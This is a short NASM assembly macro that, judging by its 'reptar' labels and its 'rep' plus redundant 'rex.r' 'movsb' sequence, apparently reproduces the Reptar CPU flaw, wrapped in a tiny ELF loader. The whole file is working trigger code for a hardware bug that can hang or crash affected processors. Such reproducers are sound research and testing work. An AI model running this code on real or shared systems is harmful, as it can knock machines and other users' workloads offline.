%macro TINY_ELF_PAYLOAD 0
_start:
    lea rax, [rsp - 0x1000]
    mov rbx, rax
    mov r14, 0x41
    xor rbp, rbp
    mov rdx, .end_of_program
    lea r13, [rsp-0x4000]
    mov r15, .skip_reptar_alias
    push rdx
    xor rdx, rdx
    align 128
    times 0x700 nop
    .loop_for_every_iteration:
        .loop_only_on_bug:
            clflush [rax]
            clflush [rax+64]
            mov rsi, rax
            mov rdi, rax
            mov cl, 1
            add rdx, 1
            mov r9, rdx
            sub r9, rbp
            cmp r9, 0xb0 ; we are past vdso
            cmova rax, r13 ; this will PF but recover
            cmova rbx, r14
            align 64
            times 64-16 nop
            clflush [rax]
            clflush [rbx+1]
            .reptar:
                rep
                db 0x44; rex.r
                movsb
            .after_reptar:
                rep
                times 64 nop
                jmp r15

            .reptar_alias:
                nop
                nop
                nop
            .after_reptar_alias:
                times 100 nop
                ; kill
                mov eax, 0
                mov ebx, 0
                int 0x80

            .skip_reptar_alias:
                inc rbp
                jmp .loop_for_every_iteration
            .end_of_program:
                int3
                int3
%endmacro

%include "third_party/tiny_elf.asm"
